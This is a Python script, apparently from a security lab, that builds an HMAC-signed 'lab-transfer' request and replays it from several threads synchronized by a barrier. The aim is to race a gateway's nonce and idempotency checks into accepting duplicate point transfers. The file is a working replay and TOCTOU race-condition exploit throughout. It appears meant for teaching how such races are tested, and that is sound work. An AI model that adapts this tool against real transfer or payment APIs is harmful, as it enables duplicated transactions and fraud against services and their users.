#!/usr/bin/env python3
import json
import hmac
import base64
import hashlib
import argparse
import threading
import urllib.request
import urllib.error

SECRET = "LAB_ONLY_DEMO_HMAC_SECRET"

def build_captured_bundle(label):
    client_id = "student-a"
    nonce = f"capture-{label}"
    idem_key = f"capture-transfer-{label}"
    body = json.dumps({
        "from": client_id,
        "to": "lab-store",
        "points": 10,
        "note": f"CAPTURED_{label}"
    }, separators=(",", ":"))
    canonical = f"{client_id}|{nonce}|{idem_key}|{body}"
    sig = hmac.new(SECRET.encode("utf-8"), canonical.encode("utf-8"), hashlib.sha256).hexdigest()
    bundle = {
        "client_id": client_id,
        "nonce": nonce,
        "idempotency_key": idem_key,
        "body": body,
        "signature": sig
    }
    return base64.b64encode(json.dumps(bundle).encode("utf-8")).decode("utf-8")

def main():
    parser = argparse.ArgumentParser(description="Concurrent Signed HTTP Request Replay & TOCTOU Race Exploit Tool")
    parser.add_argument("--target", default="192.168.10.2", help="Gateway IP")
    parser.add_argument("--label", required=True, help="Capture label (e.g. race-001 or secure-001)")
    parser.add_argument("--threads", type=int, default=2, help="Number of concurrent replay threads")
    args = parser.parse_args()

    b64_capture = build_captured_bundle(args.label)
    decoded_bundle = json.loads(base64.b64decode(b64_capture.encode("utf-8")).decode("utf-8"))

    client_id = decoded_bundle["client_id"]
    nonce = decoded_bundle["nonce"]
    idem_key = decoded_bundle["idempotency_key"]
    body = decoded_bundle["body"]
    sig = decoded_bundle["signature"]
    nonce_fp = hashlib.sha256(nonce.encode("utf-8")).hexdigest()[:12]

    print(f"=== [CAPTURED SIGNED REQUEST BUNDLE: {args.label}] ===")
    print(f"Base64 Capture   : {b64_capture[:64]}...")
    print(f"X-Lab-Key-Id     : {client_id}")
    print(f"X-Lab-Nonce      : {nonce} (SHA-256 Fingerprint: {nonce_fp})")
    print(f"Idempotency-Key  : {idem_key}")
    print(f"X-Lab-Signature  : {sig}")
    print(f"JSON Body        : {body}\n")

    url = f"http://{args.target}/api/lab-transfer"
    headers = {
        "Content-Type": "application/json",
        "X-Lab-Key-Id": client_id,
        "X-Lab-Nonce": nonce,
        "Idempotency-Key": idem_key,
        "X-Lab-Signature": sig
    }

    barrier = threading.Barrier(args.threads)
    results = [None] * args.threads

    def worker(idx):
        req = urllib.request.Request(url, data=body.encode("utf-8"), headers=headers, method="POST")
        barrier.wait()  # Synchronize threads to fire at the exact same millisecond!
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                results[idx] = (resp.status, resp.read().decode("utf-8").strip())
        except urllib.error.HTTPError as e:
            results[idx] = (e.code, e.read().decode("utf-8").strip())

    threads = [threading.Thread(target=worker, args=(i,)) for i in range(args.threads)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    for i, (code, resp_text) in enumerate(results, 1):
        status_label = "Created" if code == 201 else ("Conflict" if code == 409 else "Response")
        print(f"=== [CONCURRENT REPLAY THREAD #{i}] -> HTTP/1.0 {code} {status_label} ===")
        print(resp_text)

if __name__ == "__main__":
    main()
